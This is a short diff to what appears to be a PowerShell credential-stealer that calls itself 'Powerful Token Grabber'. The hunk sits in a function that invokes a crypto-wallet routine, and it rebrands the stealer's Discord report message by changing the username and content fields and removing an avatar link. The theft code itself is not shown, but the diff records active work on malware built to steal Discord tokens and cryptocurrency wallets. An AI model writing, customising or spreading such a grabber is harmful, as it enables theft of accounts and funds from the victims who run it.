@@ -659,12 +659,11 @@ function Backup-Data {
     Invoke-Crypto_Wallets
 
     $embed_and_body = @{
-        "username" = "KDOT"
-        "content" = "@everyone"
+        "username" = "POWER"
+        "content" = "Haiiii"
         "title" = "KDOT"
         "description" = "Powerful Token Grabber"
         "color" = "3447003"
-        "avatar_url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
         "url" = "https://discord.gg/vk3rBhcj2y"
         "embeds" = @(
             @{
